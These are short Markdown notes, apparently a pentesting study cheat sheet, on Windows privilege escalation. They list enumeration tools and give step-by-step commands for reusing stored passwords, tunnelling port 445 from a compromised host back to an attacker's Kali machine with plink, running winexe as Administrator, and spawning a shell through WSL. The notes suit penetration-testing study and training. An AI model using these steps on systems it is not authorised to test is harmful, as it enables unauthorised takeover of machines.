# Privilege Escalation Tips for Windows

## Automated Tools
1. winPEAS.exe (Executable) - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
2. Sherlock.ps1 (PowerShell) - https://github.com/rasta-mouse/Sherlock
3. PowerUp.ps1 (PowerShell) - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
4. jaws-enum.ps1 (PowerShell) - https://github.com/411Hall/JAWS
5. windows-exploit-suggester.py - https://github.com/AonCyberLabs/Windows-Exploit-Suggester

## Summary of Possible Windows Priv Esc
1. Kernel Exploits
2. Stored Passwords 


## Tips

- https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

## Stored Passwords

1. Get the password; could be a WinLogon or AutoLogon password
2. Download plink.exe - https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html (plink.exe (a command-line interface to the PuTTY back ends)
3. Transfer plink.exe to the exploited machine
4. Set `PermitRootLogin` to `yes` on Kali - `sudo vi /etc/ssh/sshd_config`
5. `sudo service ssh restart`
6. On exploited machine, run `plink.exe -l [KALI USER] -pw [KALI's PW] -R 445:127.0.0.1:445 [KALI's IP ADDRESS]
7. `winexe -U Administrator%[ENTER STORED PW]` //127.0.0.1 "cmd.exe"

## Escalation via Windows Subsystem for Linux

1. Locate the bash.exe and wsl.exe - `where /R C:\Windows bash.exe` `where /R C:\Windows wsl.exe`
2. Run bash.exe on WSL in the Windows machine 
3. In the WSL bash.exe, run `python -c "import pty;pty.spawn('/bin/bash')"`
4. Get credentials here?
